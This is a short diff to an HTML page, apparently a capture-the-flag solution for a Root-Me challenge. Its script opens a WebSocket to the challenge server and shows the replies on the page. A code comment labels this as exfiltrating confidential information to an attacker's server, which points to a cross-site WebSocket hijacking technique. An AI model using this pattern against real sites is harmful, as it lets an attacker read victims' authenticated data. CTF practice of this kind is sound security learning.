@@ -10,7 +10,7 @@
     <h1 id="result"></h1>
 </body>
 <script>
-    let result = null;
+    //let result = null;
     websocket = new WebSocket('ws://ctf03.root-me.org/ws')
     websocket.onopen = start
     websocket.onmessage = handleReply
@@ -20,8 +20,10 @@
     function handleReply(event) {
     //Exfiltrate the confidential information to attackers server
     console.log(event.data)
-    result = event.data
+    let result = event.data
+    console.log(event.data)
+    document.getElementById("result").textContent = result;
     }
-    document.getElementById("result").value = result;
+    
 </script>
 </html>
